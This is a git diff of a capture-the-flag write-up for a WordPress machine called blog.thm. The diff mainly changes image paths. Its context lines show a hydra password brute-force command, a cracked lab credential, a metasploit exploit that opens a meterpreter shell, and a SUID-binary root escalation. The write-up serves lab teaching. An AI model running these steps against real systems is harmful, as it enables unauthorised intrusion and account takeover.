@@ -117,17 +117,17 @@ smb: \> ls
 
 The `check-this.png` file contains a QR code which simply takes us to a Youtube video, in the `Alice-White-Rabbit.jpg`, we can extract the hidden data, it gives us a `rabbit_hole.txt` file, which says this:
 
-![](cybersecurity/images/Pasted%2520image%252020250327173926.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327173926.png)
 
 The `tswift.mp4` file does not contain anything, seems like the SMB is not useful for now, let's proceed to the web application, if we remember, `robots.txt` entrance is allowed:
 
-![](cybersecurity/images/Pasted%2520image%252020250327174241.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327174241.png)
 
 
 
 If we try to go to `/wp-admin/`:
 
-![](cybersecurity/images/Pasted%2520image%252020250327174317.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327174317.png)
 
 We need to add `blog.thm` to `/etc/hosts`:
 
@@ -211,7 +211,7 @@ We got two users, what about trying to bruteforce with hydra:
 hydra -l kwheel -P /usr/share/wordlists/rockyou.txt blog.thm http-post-form "/wp-login.php:log=kwheel&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered"
 ```
 
-![](cybersecurity/images/Pasted%2520image%252020250327183359.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327183359.png)
 
 We got it:
 
@@ -220,7 +220,7 @@ kwheel:cutiepie1
 ```
 
 
-![](cybersecurity/images/Pasted%2520image%252020250328145550.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328145550.png)
 
 
 # EXPLOITATION
@@ -229,9 +229,9 @@ kwheel:cutiepie1
 We got the login, we can search for an exploit regarding the `wordpress 5.0` 
 
 
-![](cybersecurity/images/Pasted%2520image%252020250328145750.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328145750.png)
 
-![](cybersecurity/images/Pasted%2520image%252020250328150658.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328150658.png)
 
 
 
@@ -248,7 +248,7 @@ exploit
 
 After we send the exploit, we get a `meterpreter` session:
 
-![](cybersecurity/images/Pasted%2520image%252020250328150952.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328150952.png)
 
 We can migrate into netcat for a more comfortable shell or stay in meterpreter, I decided to migrate just for run:
 
@@ -283,7 +283,7 @@ find / -perm -4000 2>/dev/null
 
 We can find this:
 
-![](cybersecurity/images/Pasted%2520image%252020250328152927.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328152927.png)
 
 There's something unusual, a binary called `/usr/sbin/checker`, let's check it out:
 
@@ -306,7 +306,7 @@ We can do the following in order to get a root shell:
 admin=1 /usr/sbin/checker /bin/sh
 ```
 
-![](cybersecurity/images/Pasted%2520image%252020250328153450.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328153450.png)
 
 Let's try reading flags:
 
